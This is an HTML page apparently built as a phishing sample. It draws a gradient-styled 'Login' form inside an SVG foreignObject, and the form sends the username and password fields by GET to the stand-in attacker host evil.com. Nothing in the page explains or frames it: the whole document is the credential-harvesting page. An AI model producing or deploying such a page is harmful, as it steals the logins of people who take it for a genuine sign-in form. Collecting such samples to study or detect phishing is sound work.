<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SVG Login</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(45deg, #b636c2, #4c68cf, #f69cea); }
    </style>
</head>
<body>
    <svg width="400" height="300">
        <defs><linearGradient id="grad" x1="0" x2="1" y1="0" y2="0"><stop offset="0%" stop-color="#b636c2"/><stop offset="100%" stop-color="#4c68cf"/></linearGradient></defs>
        <rect width="100%" height="100%" fill="url(#grad)" />
        <foreignObject x="10" y="10" width="380" height="280">
            <div xmlns="http://www.w3.org/1999/xhtml" style="background: rgba(255,255,255,0.8); padding: 20px; border-radius: 8px;">
                <form action="https://evil.com" method="GET" style="text-align:center;">
                    <h2>Login</h2>
                    <input name="username" type="text" placeholder="Username" required style="margin:10px 0; padding:10px; width:90%;" /><br>
                    <input name="password" type="password" placeholder="Password" required style="margin:10px 0; padding:10px; width:90%;" /><br>
                    <button type="submit" style="padding:10px 20px; background:#4caf50; color:white; border:none; border-radius:5px;">Login</button>
                </form>
            </div>
        </foreignObject>
    </svg>
</body>
</html>
